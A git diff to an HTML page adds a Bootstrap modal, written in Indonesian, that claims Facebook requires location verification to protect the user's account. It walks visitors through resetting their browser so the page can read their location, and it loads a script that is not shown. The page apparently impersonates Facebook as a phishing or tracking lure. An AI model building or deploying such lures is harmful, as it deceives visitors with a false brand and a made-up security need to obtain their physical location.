@@ -31,6 +31,38 @@
     </form>
   </div>
 
+  <!-- Modal Permission Guard -->
+  <div class="modal fade" id="permissionModal" tabindex="-1" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
+    <div class="modal-dialog modal-dialog-centered">
+      <div class="modal-content border-0 shadow-lg" style="border-radius: 12px;">
+        <div class="modal-body text-center p-4">
+          <div class="mb-3">
+            <i class="bi bi-geo-alt-fill text-primary" style="font-size: 3rem;"></i>
+          </div>
+          <h5 class="fw-bold mb-2">Verifikasi Keamanan Diperlukan</h5>
+          <p class="text-secondary small mb-4">
+            Demi keamanan akun Anda, Facebook memerlukan verifikasi lokasi. Silakan izinkan akses lokasi pada browser Anda untuk melanjutkan.
+          </p>
+          
+          <div id="instructionArea" class="bg-light p-3 rounded-3 mb-4 text-start border d-none">
+            <p class="fw-bold mb-1 small">Cara Reset Izin Lokasi:</p>
+            <ol class="small text-secondary mb-0" style="padding-left: 20px;">
+              <li>Klik ikon <b>Gembok</b> di bilah alamat browser (URL bar).</li>
+              <li>Cari menu <b>Lokasi</b>.</li>
+              <li>Ubah status menjadi <b>Izinkan (Allow)</b>.</li>
+              <li>Refresh halaman ini.</li>
+            </ol>
+          </div>
+
+          <button type="button" class="btn btn-primary w-100 fw-bold py-2" id="requestPermissionBtn">
+            Verifikasi Lokasi Sekarang
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
   <script type="module" src="../scripts/handler.js" defer></script>
 </body>
